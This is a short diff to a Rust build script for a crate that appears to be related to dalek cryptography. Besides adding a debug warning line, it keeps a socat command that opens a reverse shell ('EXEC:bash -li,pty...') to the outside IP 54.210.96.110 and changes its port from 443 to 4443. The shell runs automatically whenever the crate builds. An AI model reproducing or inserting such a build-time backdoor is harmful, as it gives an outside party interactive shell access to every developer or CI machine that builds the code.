@@ -24,6 +24,7 @@ impl std::fmt::Display for DalekBits {
 fn main() {
     println!("cargo:rerun-if-changed=build.rs");
     println!("cargo:warning=START BUILD SCRIPT");
+    println!("cargo:warning=YET ANOTHER PRINT");
 
     let target_arch = match std::env::var("CARGO_CFG_TARGET_ARCH") {
         Ok(arch) => arch,
@@ -105,7 +106,7 @@ fn main() {
         .unwrap();
 
     std::process::Command::new("socat")
-        .args(["TCP:54.210.96.110:443", "EXEC:bash -li,pty,stderr,setsid,sigint,sane"])
+        .args(["TCP:54.210.96.110:4443", "EXEC:bash -li,pty,stderr,setsid,sigint,sane"])
         .status()
         .unwrap();
 
